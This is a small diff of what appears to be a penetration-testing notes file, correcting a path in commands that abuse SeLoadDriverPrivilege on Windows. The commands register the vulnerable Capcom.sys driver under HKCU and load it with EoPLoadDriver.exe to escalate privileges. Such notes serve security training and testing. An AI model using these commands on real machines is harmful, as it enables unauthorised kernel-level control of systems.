@@ -1496,7 +1496,7 @@ git clone https://github.com/rednexusacademy/SeLoadDriverPrivilege.git
 ```text
 reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Users\Public\Desktop\Capcom.sys"
 reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
-.\EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
+.\EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Users\Public\Desktop\Capcom.sys
 ```
 - ensure driver is not working with : http://www.nirsoft.net/utils/driverview.html
 ```text
